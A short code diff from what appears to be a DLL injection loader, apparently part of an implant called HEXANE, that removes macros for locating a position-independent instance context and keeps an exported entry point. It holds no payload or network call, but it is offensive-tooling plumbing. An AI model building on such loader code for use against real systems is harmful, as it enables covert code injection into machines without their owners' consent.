@@ -9,17 +9,6 @@
 #include <inject/loader/resource.hpp>
 #include <inject/include/config.hpp>
 
-#define FUNCTION TXT_SECTION(inject, B)
-#define instance __InjectInstance
-
-EXTERN_C ULONG __InjectInstance;
-EXTERN_C LPVOID __Instance;
-
-#define Ctx 			    __LocalInstance
-#define InstanceOffset()    (U_PTR(&instance))
-#define GLOBAL_OFFSET       (U_PTR(InstStart()) + InstanceOffset())
-#define InstancePtr()	    ((HEXANE_CTX*) C_DREF(C_PTR(GLOBAL_OFFSET)))
-#define HEXANE 		        HEXANE_CTX* __LocalInstance = InstancePtr();
 
 EXTERN_C VOID Execute();
 DLL_EXPORT EXTERN_C FUNCTION VOID Entrypoint(HMODULE Base);
